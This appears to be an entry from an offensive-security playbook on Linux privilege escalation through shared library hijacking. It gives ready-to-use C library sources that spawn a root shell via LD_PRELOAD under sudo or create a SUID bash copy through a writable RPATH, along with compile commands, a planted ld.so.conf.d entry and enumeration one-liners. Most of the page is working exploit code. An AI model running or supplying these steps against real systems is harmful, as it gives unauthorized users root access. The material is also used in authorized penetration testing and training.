---
id: linux-shared-lib
title: Shared Library Hijacking
stage: privesc
tags: [linux]
summary: Hijack shared library loading via LD_PRELOAD, writable RPATH, or ldconfig paths — a SUID binary or sudo command loading your library runs your code as root.
leads_to:
  - root-linux
---

## Prerequisites

A low-privilege shell. One of: `env_keep+=LD_PRELOAD` in `sudo -l` output, a SUID binary with an RPATH pointing to a writable directory, or write access to a directory in `/etc/ld.so.conf`. `gcc` available for compiling the library (or cross-compile on attacker).

Shared library hijacking exploits the order in which Linux resolves `.so` files. LD_PRELOAD is the simplest — it loads your library before all others — but is stripped for SUID binaries (only works with sudo). RPATH is embedded in the binary and bypasses LD_PRELOAD restrictions, making it exploitable even for SUID. Always run `ldd` on the target binary to see what libraries it loads before writing the payload.

## Quick Win

> Check LD_PRELOAD first (sudo -l), then RPATH (readelf), then missing library deps (ldd).

```bash
sudo -l | grep LD_PRELOAD
readelf -d /usr/local/bin/suid_binary | grep -i rpath
ldd /usr/local/bin/suid_binary | grep "not found"
```

## LD_PRELOAD via sudo

> If `env_keep+=LD_PRELOAD` is in sudo output — compile a library that spawns a root shell.

```bash
# Check sudo config
sudo -l
# Must show: Defaults env_keep+=LD_PRELOAD

cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles

# Run any allowed sudo binary with the library
sudo LD_PRELOAD=/tmp/evil.so /any/allowed/command
```

## Writable RPATH

> Binary has RPATH pointing to /tmp or another writable dir — place your library there.

```bash
# Find RPATH in the binary
readelf -d /usr/local/bin/suid_binary | grep -i rpath
# RPATH: /tmp/lib

# Identify the missing library
ldd /usr/local/bin/suid_binary
# libcustom.so.1 => not found

# Create malicious library in the RPATH location
cat > /tmp/lib/libcustom.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash");
}
EOF
gcc -shared -fPIC -o /tmp/lib/libcustom.so.1 /tmp/lib/libcustom.c

# Run the binary — loads your library as root
/usr/local/bin/suid_binary
/tmp/bash -p
```

## Writable /etc/ld.so.conf.d/

> Add your directory to the global library search path — affects all programs.

```bash
ls -la /etc/ld.so.conf.d/
find /etc/ld.so.conf.d/ -writable 2>/dev/null

echo "/tmp/lib" > /etc/ld.so.conf.d/evil.conf
ldconfig
# Now any program loading a library by that name will find yours first
```

## SUID Binary with Missing Library

> Find SUID binaries that try to load a library that doesn't exist — place yours in the search path.

```bash
find / -perm -4000 2>/dev/null -exec ldd {} \; 2>/dev/null | grep "not found"
# "not found" = place your library in any directory in ld.so search path
```

## Leads To

LD_PRELOAD with sudo → bash shell as root → root-linux. RPATH hijack → SUID bash created → `/tmp/bash -p` → root. Missing library exploit → same. LD_PRELOAD is dropped for pure SUID binaries — RPATH and ldconfig bypasses work even when LD_PRELOAD is restricted.
